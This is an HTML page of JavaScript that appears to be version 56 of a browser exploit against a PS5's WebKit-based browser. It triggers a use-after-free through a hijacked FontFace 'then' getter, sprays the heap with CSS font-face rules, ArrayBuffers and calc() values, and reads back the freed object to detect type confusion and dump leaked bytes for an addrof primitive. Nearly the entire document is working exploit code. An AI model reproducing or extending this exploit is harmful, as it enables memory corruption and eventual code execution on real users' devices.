<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 - CSSValue Type Confusion & Addrof (v56)</title>
<style>
body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
pre { white-space: pre-wrap; word-wrap: break-word; }
</style>
</head>
<body>
<pre id="out"></pre>
<script>
var out = document.getElementById("out");
function log(m) { out.textContent += m + "\n"; }

log("=== CSSValue Type Confusion & Addrof (v56) ===\n");

// ============================================
// PHASE 1: UAF SETUP (مطابقة لـ v46 تماماً)
// ============================================
log("[*] Phase 1: UAF Setup...");

var sheet = document.createElement('style');
document.head.appendChild(sheet);
var sh = sheet.sheet;

// Holes
log("[*] Creating holes...");
var holes = [];
for (var i = 0; i < 4096; i++) {
    holes.push(new FontFace('hole' + i, 'local(NoFont' + (i%100) + ')'));
}

// Flush rules
log("[*] Creating flush rules...");
for (var i = 0; i < 768; i++) {
    sh.insertRule('@font-face{font-family:flush' + i + ';src:local(NF' + i + ')}', i);
}

// Trigger + x
sh.insertRule('@font-face{font-family:trigger;src:local(Courier)}', sh.cssRules.length);
sh.insertRule('@font-face{font-family:x;src:local(Courier)}', sh.cssRules.length);

var uafFired = false;
var aFace = null;

Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get: function() {
        if (!uafFired) {
            uafFired = true;
            log("[*] UAF FIRED! Deleting x rule...");
            
            var xIdx = -1;
            for (var i = 0; i < sh.cssRules.length; i++) {
                if (sh.cssRules[i].cssText.indexOf('font-family:x') !== -1) {
                    xIdx = i; break;
                }
            }
            if (xIdx !== -1) sh.deleteRule(xIdx);
            
            for (var i = 767; i >= 0; i--) {
                if (sh.cssRules[i] && sh.cssRules[i].cssText.indexOf('flush') !== -1) {
                    sh.deleteRule(i);
                }
            }
            
            var gc = [];
            for (var i = 0; i < 4000; i++) gc.push(new ArrayBuffer(4096));
            gc = null;
            
            log("[*] Spraying 2048 A_ faces...");
            for (var i = 0; i < 2048; i++) {
                sh.insertRule('@font-face{font-family:A_' + i + ';src:local(AF' + i + ')}', sh.cssRules.length);
            }
        }
        return undefined;
    }
});

// ============================================
// PHASE 2: TRIGGER UAF
// ============================================
log("[*] Phase 2: Triggering UAF...");

document.fonts.load("1em trigger, x", "AB").then(function(faces) {
    log("[*] Load returned " + faces.length + " faces");
    
    for (var i = 0; i < faces.length; i++) {
        if (faces[i].family && faces[i].family.indexOf('A_') === 0) {
            aFace = faces[i];
            break;
        }
    }
    
    if (!aFace) {
        log("[-] No confused face found!");
        for (var i = 0; i < faces.length; i++) log("    Face[" + i + "]: " + faces[i].family);
        return;
    }
    
    log("[+] Confused face obtained: " + aFace.family);
    
    var aIdx = -1;
    for (var i = 0; i < sh.cssRules.length; i++) {
        if (sh.cssRules[i].cssText.indexOf(aFace.family) !== -1) {
            aIdx = i; break;
        }
    }
    if (aIdx === -1) { log("[-] CSSRule not found!"); return; }
    
    // ============================================
    // PHASE 3: CSSVALUE TYPE CONFUSION
    // ============================================
    log("\n[*] Phase 3: CSSValue Type Confusion...");
    log("[*] Freeing CSSFontFace object by deleting its CSSRule...");
    
    // حذف قاعدة A_NN سيحرر كائن CSSFontFace من IsoHeap
    sh.deleteRule(aIdx);
    log("[*] CSSRule deleted. Object is now freed.");
    
    // رش كائنات CSSCalcValue لملء الفتحة
    log("[*] Spraying CSSCalcValue objects to reclaim the slot...");
    var calcEls = [];
    for (var i = 0; i < 2000; i++) {
        var el = document.createElement('div');
        el.style.width = 'calc(' + (i + 1) + 'px + ' + (i + 2) + 'px)';
        document.body.appendChild(el);
        calcEls.push(el);
    }
    
    // محاولة قراءة family من الكائن المحرر
    log("[*] Attempting to read font-family from freed object...");
    try {
        var readFam = aFace.family;
        log("[+] font-family read: " + readFam);
        log("[+] Type: " + typeof readFam);
        
        if (typeof readFam === 'string' && readFam.length > 0 && readFam !== aFace.family) {
            log("[+] !!! TYPE CONFUSION DETECTED !!!");
            log("[+] Leaked value: " + readFam);
            log("[+] String length: " + readFam.length);
            
            // استخراج البايتات كـ Hex (لتحليل العناوين)
            log("[+] Hex dump:");
            for (var i = 0; i < Math.min(readFam.length, 16); i++) {
                log("    [" + i + "] = 0x" + readFam.charCodeAt(i).toString(16));
            }
        } else {
            log("[-] No confusion detected. Value: " + readFam);
        }
    } catch(e) {
        log("[+] CRASH/ERROR: " + e.message);
        log("[+] This may indicate type confusion occurred!");
    }
    
    for (var el of calcEls) el.remove();
    log("\n=== v56 COMPLETE ===");
}).catch(function(e) {
    log("[-] Promise rejected: " + e.message);
});
</script>
</body>
</html>
